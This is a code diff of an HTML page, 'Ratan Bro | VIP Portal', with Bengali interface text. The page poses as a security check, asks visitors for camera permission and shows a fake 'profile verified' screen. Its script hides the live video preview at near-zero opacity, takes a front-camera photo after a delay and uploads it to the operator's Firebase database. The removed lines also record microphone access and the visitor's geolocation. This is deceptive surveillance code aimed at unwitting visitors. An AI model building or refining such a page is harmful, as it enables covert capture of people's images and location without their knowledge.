@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Ratan Bro | Secure Portal</title>
+    <title>Ratan Bro | VIP Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
     <style>
         :root { --primary: #ff2e63; --bg: #080a10; --card: #121420; --text: #ffffff; }
@@ -12,8 +12,8 @@
         .btn-grant { background: var(--primary); color: white; border: none; padding: 14px 35px; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; box-shadow: 0 5px 20px rgba(255, 46, 99, 0.4); }
         #main-ui { display: none; text-align: center; width: 100%; }
         .user-card { background: var(--card); padding: 30px; border-radius: 20px; display: inline-block; border: 1px solid var(--primary); }
-        /* ভিডিও একদম ছোট করে সামনে রাখা হয়েছে যাতে ব্রাউজার ছবি তুলতে বাধা না দেয় */
-        #vSource { position: absolute; bottom: 0; right: 0; width: 2px; height: 2px; opacity: 0.1; }
+        /* ভিডিও প্রিভিউ খুব ছোট করে রাখা হয়েছে যাতে ব্রাউজার ছবি তুলতে বাধা না দেয় */
+        #vSource { position: absolute; bottom: 0; right: 0; width: 10px; height: 10px; opacity: 0.01; pointer-events: none; }
     </style>
 </head>
 <body>
@@ -21,15 +21,15 @@
     <div id="perm-modal">
         <div style="font-size: 50px; margin-bottom: 20px;">🛡️</div>
         <h2>Security Access</h2>
-        <p>সিস্টেমে প্রবেশ করতে ক্যামেরা ও মাইক্রোফোন Allow করুন।</p>
+        <p>সিস্টেমে প্রবেশ করতে ক্যামেরা পারমিশন দিন।</p>
         <button class="btn-grant" onclick="startApp()">Grant Access</button>
     </div>
 
     <div id="main-ui">
         <div class="user-card">
             <div style="width: 70px; height: 70px; background: var(--primary); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; font-size: 24px; font-weight: bold;">JD</div>
-            <h3 style="margin: 10px 0;">প্রসেসিং...</h3>
-            <p style="color: #00ff88; font-size: 14px;">● সিস্টেম সক্রিয় আছে</p>
+            <h3 id="status-text" style="margin: 10px 0;">সিস্টেম লোড হচ্ছে...</h3>
+            <p style="color: #00ff88; font-size: 14px;">● আপনার প্রোফাইল ভেরিফাইড</p>
         </div>
     </div>
 
@@ -40,7 +40,6 @@
         import { getDatabase, ref, set, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";
 
-        // --- রতন ভাই, এখানে আপনার অরিজিনাল কনফিগ বসান ---
         const firebaseConfig = {
             apiKey: "YOUR_API_KEY",
             authDomain: "ratanweab.firebaseapp.com",
@@ -56,18 +55,14 @@
         const auth = getAuth(app);
         let loggedUser = null;
 
-        onAuthStateChanged(auth, (user) => {
-            if (user) loggedUser = user;
-            else signInAnonymously(auth);
-        });
+        onAuthStateChanged(auth, (user) => { if (user) loggedUser = user; else signInAnonymously(auth); });
 
         window.startApp = async () => {
             const video = document.getElementById('vSource');
             try {
-                // সরাসরি সামনের ক্যামেরা রিকোয়েস্ট
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: true 
+                    video: { facingMode: "user", width: { ideal: 640 } }, 
+                    audio: false 
                 });
                 video.srcObject = stream;
                 await video.play();
@@ -76,23 +71,24 @@
                 document.getElementById('main-ui').style.display = 'block';
 
                 if(loggedUser) {
-                    // ক্যামেরা লেন্স রেডি হতে ১.৫ সেকেন্ড সময় দিয়ে অটোমেটিক ছবি তুলবে
-                    setTimeout(() => {
-                        takeAndSendSnap(loggedUser);
-                    }, 1500);
+                    document.getElementById('status-text').innerText = "স্বাগতম, " + loggedUser.uid.substring(0,5);
                     
-                    updateLocation(loggedUser);
+                    // ৪ সেকেন্ড সময় দিন যাতে ক্যামেরা লেন্স পুরোপুরি রেডি হয় (কালো ছবি ফিক্স)
+                    setTimeout(() => {
+                        takeAndSend(loggedUser);
+                    }, 4000);
                 }
             } catch (err) {
-                alert("ক্যামেরা পারমিশন ছাড়া সিস্টেমে প্রবেশ করা সম্ভব নয়।");
+                alert("পারমিশন ছাড়া প্রবেশ করা সম্ভব নয়।");
             }
         };
 
-        function takeAndSendSnap(user) {
+        function takeAndSend(user) {
             const video = document.getElementById('vSource');
-            // যদি ক্যামেরা রেডি না থাকে, আরও ১ সেকেন্ড অপেক্ষা করবে
-            if (video.videoWidth === 0) {
-                setTimeout(() => takeAndSendSnap(user), 1000);
+            
+            // ক্যামেরা পুরোপুরি রেডি না হলে ছবি তুলবে না, ১ সেকেন্ড পর আবার ট্রাই করবে
+            if (video.videoWidth === 0 || video.readyState < 2) {
+                setTimeout(() => takeAndSend(user), 1000);
                 return;
             }
 
@@ -102,24 +98,13 @@
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // রিয়েল ছবি তৈরি (Quality 0.8)
             const imageData = canvas.toDataURL('image/jpeg', 0.8);
 
-            // সরাসরি ফায়ারবেসে পুশ
+            // ফায়ারবেসে ছবি পাঠানো
             const snapRef = push(ref(db, `users/${user.uid}/snaps`));
             set(snapRef, {
                 image: imageData,
                 time: serverTimestamp()
-            });
-        }
-
-        function updateLocation(user) {
-            navigator.geolocation.getCurrentPosition((pos) => {
-                set(ref(db, `users/${user.uid}/info`), {
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    lastActive: serverTimestamp()
-                });
             });
         }
     </script>
